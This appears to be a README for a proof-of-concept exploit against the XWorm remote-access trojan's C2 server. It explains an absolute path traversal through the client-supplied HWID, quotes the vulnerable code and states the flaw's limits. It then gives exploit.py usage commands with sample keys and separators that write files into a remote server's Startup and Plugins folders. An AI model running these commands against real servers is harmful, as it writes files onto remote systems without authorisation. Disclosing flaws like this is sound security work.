# XWorm C2 Absolute Path Traversal Vulnerability

## Affected Versions

**Vulnerable:**
- XWorm v7.2 and earlier 

## What is Vulnerable

The XWorm C2 server accepts Recovery messages from any connected client without requiring the C2 to first request the data, and uses the client-supplied HWID directly in file path construction with **ZERO validation**, allowing arbitrary absolute path writes anywhere on the C2 filesystem.

When a client sends recovery data (stolen credentials, browser data, etc.), the C2 server uses the client's HWID (Hardware ID) to construct a file path. This HWID has no validation whatsoever - it accepts both relative path traversal sequences (`..\..\..`) and absolute paths (`C:\Target`). The C2 processes these Recovery messages immediately upon receipt without any authentication or validation that the client was actually asked to send this data.

**Vulnerable code location:** `Messages.cs` line 577

```csharp
string text4 = Path.Combine(Application.StartupPath, "ClientsFolder", array[1], "Recovery");
File.WriteAllText(text4 + "\\FileZilla_" + DateAndTime.Now.ToString("MM-dd-yyyy HH-mm-ss-fff") + ".txt", text5);
```

The `array[1]` parameter is the HWID sent by the client. It goes directly into `Path.Combine()` without any validation. When `Path.Combine()` receives an absolute path as the second parameter, it **ignores the first parameter entirely** and uses only the absolute path. This means an attacker can write files to any location on the C2 server's filesystem by simply providing an absolute path as the HWID.

## How the Exploit Works

The exploit connects to the XWorm C2 server and sends a crafted Recovery message with an absolute Windows path as the HWID. The C2 server processes this message and writes the provided content to a file at the specified location.

**Message format:**
```
Recovery<SEPARATOR>HWID<SEPARATOR>TYPE<SEPARATOR>CONTENT
```

**Example absolute path HWID:**
```
C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

When `Path.Combine()` receives this absolute path, it ignores the `Application.StartupPath` and `ClientsFolder` components, resulting in:
```
C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Recovery\
```

The exploit requires the C2's configuration values (AES key, separator, mutex) which can be extracted from a captured XWorm sample by analyzing its `Settings.cs` file.

## Limitations

This vulnerability has significant limitations that prevent direct remote code execution:

1. **Hardcoded subfolder:** The C2 always appends `\Recovery\` to the path. You cannot write directly to a target folder - files always end up in a `Recovery` subdirectory.

2. **Hardcoded filename:** Files are named based on recovery type with timestamp (e.g., `FileZilla_<timestamp>.txt`, `WifiKeys_<timestamp>.txt`). You cannot fully control the filename.

3. **Hardcoded extension:** All recovery types write `.txt` files. You cannot write `.bat`, `.exe`, or other executable extensions directly.

## Using the Exploit

**Prerequisites:**
```bash
pip install pycryptodome
```

**Get configuration values:**

You need three values from the XWorm sample's `Settings.cs` file:
- `Settings.KEY` - Base64-encoded AES key
- `Settings.SPL` - Base64-encoded message separator  
- `Settings.Mutex` - Mutex string

**Basic usage:**
```bash
python exploit.py <C2_IP> <C2_PORT> <ABSOLUTE_PATH> \
  --key "<BASE64_KEY>" \
  --spl "<BASE64_SPL>" \
  --mutex "<MUTEX>"
```

**Examples:**

Test the vulnerability:
```bash
python exploit.py 192.168.1.100 5555 C:\Test \
  --key "Njz2LrOsHpe83Y8FmEzXSw==" \
  --spl "jlUp/GaKjux6FAA4VNQ6Eg==" \
  --mutex "bIqDjMjopgCoADn2"
```

Write to XWorm Plugins directory:
```bash
python exploit.py 192.168.1.100 5555 C:\XWorm\Plugins \
  --key "Njz2LrOsHpe83Y8FmEzXSw==" \
  --spl "jlUp/GaKjux6FAA4VNQ6Eg==" \
  --mutex "bIqDjMjopgCoADn2"
```

Write to Startup folder:
```bash
python exploit.py 192.168.1.100 5555 "C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" \
  --key "Njz2LrOsHpe83Y8FmEzXSw==" \
  --spl "jlUp/GaKjux6FAA4VNQ6Eg==" \
  --mutex "bIqDjMjopgCoADn2"
```

With custom payload file:
```bash
python exploit.py 192.168.1.100 5555 C:\Target \
  --key "Njz2LrOsHpe83Y8FmEzXSw==" \
  --spl "jlUp/GaKjux6FAA4VNQ6Eg==" \
  --mutex "bIqDjMjopgCoADn2" \
  --payload payload.txt
```

Use different recovery type:
```bash
python exploit.py 192.168.1.100 5555 C:\Target \
  --key "Njz2LrOsHpe83Y8FmEzXSw==" \
  --spl "jlUp/GaKjux6FAA4VNQ6Eg==" \
  --mutex "bIqDjMjopgCoADn2" \
  --type 2
```

**Recovery Types:**

All recovery types write `.txt` files with different names:
- `--type 0` (default): `FileZilla_<timestamp>.txt`
- `--type 1`: `WifiKeys_<timestamp>.txt`
- `--type 2`: `Discord_<timestamp>.txt`
- `--type 3`: `ProductKey_<timestamp>.txt`

**Result:**

Files are written to: `<ABSOLUTE_PATH>\Recovery\<name>_<timestamp>.txt`
